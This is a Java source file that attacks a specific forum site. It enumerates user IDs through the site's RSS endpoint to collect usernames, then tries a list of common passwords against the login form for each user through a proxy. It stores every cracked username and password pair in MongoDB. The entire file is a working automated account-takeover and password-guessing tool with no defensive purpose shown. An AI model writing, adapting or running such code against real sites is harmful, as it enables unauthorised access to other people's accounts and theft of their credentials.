package account;

import giter.http.utils.HttpClient;

import java.io.IOException;
import java.net.UnknownHostException;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import util.DefaultProxier;

import com.mongodb.BasicDBObject;
import com.mongodb.DB;
import com.mongodb.DBCollection;
import com.mongodb.Mongo;

public class PH18Account {

	static HttpClient util = new HttpClient().connect(3000).read(30000)
			.persistCookies(false).proxier(new DefaultProxier());

	final static String dic[] = new String[] { "000000", "111111", "11111111",
			"112233", "123123", "123321", "123456", "12345678", "654321",
			"666666", "888888", "abcdef", "abcabc", "abc123", "a1b2c3",
			"aaa111", "123qwe", "qwerty", "qweasd", "admin", "password",
			"p@ssword", "passwd", "iloveyou", "5201314" };

	public static void main(String[] args) throws InterruptedException,
			UnknownHostException {

		ExecutorService pool = Executors.newFixedThreadPool(5);

		Mongo m = new Mongo();
		DB db = m.getDB("ph18");

		final DBCollection coll = db.getCollection("users");
		final Pattern ptn = Pattern.compile("<title>([^@]+)@");
		final AtomicInteger pc = new AtomicInteger();

		for (int i = 900; i < 99999; i++) {

			final int j = i;
			pool.submit(new Runnable() {
				@Override
				public void run() {

					String url = "http://www.18ph.com/home.php?mod=rss&uid="
							+ j;
					String content;

					try {

						content = util.GET(url).getValue();

						Matcher matcher = ptn.matcher(content);

						if (matcher.find()) {

							BasicDBObject dbo = new BasicDBObject("_id", j)
									.append("name", matcher.group(1));
							for (String pwd : dic) {
								if (!"wrong".equals(guess(dbo, pwd))) {
									dbo.append("pwd", pwd);
									coll.save(dbo);
									System.out.println(dbo);
									break;
								}
							}
						}

						Thread.sleep(1000);

						if (pc.incrementAndGet() % 100 == 0) {
							System.out.println(pc.get());
						}

					} catch (IOException | InterruptedException e) {
					}
				}
			});

		}

		pool.shutdown();
		pool.awaitTermination(2, TimeUnit.DAYS);

		m.close();
	}

	private static String guess(BasicDBObject dbo, String pwd)
			throws IOException {

		Map<String, String> param = new HashMap<String, String>();
		param.put("username", dbo.get("name").toString());
		param.put("cookietime", "2592000");
		param.put("password", pwd);
		param.put("quickforward", "yes");
		param.put("handlekey", "ls");

		String res = util
				.POST("http://www.18ph.com/member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes&inajax=1",
						param).getValue();

		return res.contains("欢迎您回来") ? pwd : "wrong";
	}
}
